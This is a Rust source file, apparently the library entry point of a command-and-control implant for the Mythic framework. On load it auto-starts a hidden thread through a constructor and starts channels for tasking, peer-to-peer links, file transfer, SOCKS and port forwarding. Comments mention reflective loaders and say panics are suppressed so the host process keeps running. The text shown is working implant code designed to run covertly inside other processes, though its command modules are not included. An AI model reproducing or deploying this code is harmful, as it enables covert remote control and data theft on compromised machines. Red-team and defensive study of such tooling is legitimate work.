#![allow(dead_code)]

pub mod commands;
pub mod profiles;
pub mod responses;
pub mod structs;
pub mod tasks;
pub mod utils;

/// Auto-start when loaded as a shared library.
/// Uses raw pthread_create instead of std::thread::spawn because Rust's
/// standard library may not be fully initialized during __mod_init_func.
#[ctor::ctor]
fn _auto_start() {
    unsafe {
        let mut attr: libc::pthread_attr_t = std::mem::zeroed();
        libc::pthread_attr_init(&mut attr);
        libc::pthread_attr_setstacksize(&mut attr, 8 * 1024 * 1024);

        let mut thread: libc::pthread_t = std::mem::zeroed();
        libc::pthread_create(
            &mut thread,
            &attr,
            _thread_entry,
            std::ptr::null_mut(),
        );
        libc::pthread_attr_destroy(&mut attr);
        libc::pthread_detach(thread);
    }
}

extern "C" fn _thread_entry(_: *mut libc::c_void) -> *mut libc::c_void {
    // Write to stderr for diagnostics (since we may not have logger initialized yet)
    unsafe {
        let msg = b"[dylib] Thread entry started\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }

    // Catch any panics so the host process doesn't abort
    let result = std::panic::catch_unwind(|| {
        run_main();
    });

    if let Err(e) = result {
        // Log the panic to stderr before suppressing
        let panic_msg = if let Some(s) = e.downcast_ref::<&str>() {
            format!("[dylib] PANIC: {}\n", s)
        } else if let Some(s) = e.downcast_ref::<String>() {
            format!("[dylib] PANIC: {}\n", s)
        } else {
            "[dylib] PANIC: Unknown panic payload\n".to_string()
        };

        unsafe {
            libc::write(2, panic_msg.as_ptr() as *const libc::c_void, panic_msg.len());
        }
    }

    unsafe {
        let msg = b"[dylib] Thread exiting\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }

    std::ptr::null_mut()
}

/// Entry point for shared library mode.
/// Reflective loaders and dlopen callers can also invoke this symbol directly.
/// Blocks the calling thread.
#[no_mangle]
pub extern "C" fn run_main() {
    unsafe {
        let msg = b"[dylib] run_main() entered\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }

    // Initialize env_logger if DEBUG mode is enabled
    if option_env!("DEBUG").is_some() {
        let _ = env_logger::try_init();
        unsafe {
            let msg = b"[dylib] env_logger initialized\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
    }

    unsafe {
        let msg = b"[dylib] Creating tokio runtime\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }

    // Try building runtime with explicit configuration for dylib context
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .thread_name("sebastian-worker")
        .worker_threads(4)
        .build()
        .expect("Failed to create tokio runtime");

    unsafe {
        let msg = b"[dylib] Tokio runtime created, entering block_on\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }

    rt.block_on(async {
        unsafe {
            let msg = b"[dylib] Inside async block\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }

        // 1. Initialize egress and bind profiles
        unsafe {
            let msg = b"[dylib] Initializing profiles\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        profiles::initialize();

        // 2. Initialize responses
        unsafe {
            let msg = b"[dylib] Initializing responses\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        let response_channels = responses::initialize(profiles::get_push_channel);

        // 3. Initialize P2P system
        unsafe {
            let msg = b"[dylib] Initializing P2P\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        let p2p_channels = utils::p2p::initialize(
            response_channels.p2p_connection_message_tx.clone(),
            profiles::get_mythic_id,
        );

        // 4. Initialize file transfer system
        unsafe {
            let msg = b"[dylib] Initializing file transfer\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        let (send_file_tx, get_file_tx) = utils::files::initialize();

        // 5. Initialize task system
        unsafe {
            let msg = b"[dylib] Initializing task system\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        tasks::initialize(tasks::TaskChannels {
            new_response_tx: response_channels.new_response_tx.clone(),
            send_file_to_mythic_tx: send_file_tx,
            get_file_from_mythic_tx: get_file_tx,
            add_internal_connection_tx: p2p_channels.add_connection_tx,
            remove_internal_connection_tx: p2p_channels.remove_connection_tx,
            interactive_task_output_tx: response_channels.new_interactive_task_output_tx.clone(),
            new_alert_tx: response_channels.new_alert_tx.clone(),
            from_mythic_socks_tx: response_channels.from_mythic_socks_tx.clone(),
            from_mythic_rpfwd_tx: response_channels.from_mythic_rpfwd_tx.clone(),
        });

        // 6. Start running egress profiles
        unsafe {
            let msg = b"[dylib] Starting egress profiles\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
        profiles::start().await;

        // This should never be reached as profiles::start() waits forever
        unsafe {
            let msg = b"[dylib] WARNING: profiles::start() returned!\n";
            libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
        }
    });

    unsafe {
        let msg = b"[dylib] run_main() exiting\n";
        libc::write(2, msg.as_ptr() as *const libc::c_void, msg.len());
    }
}
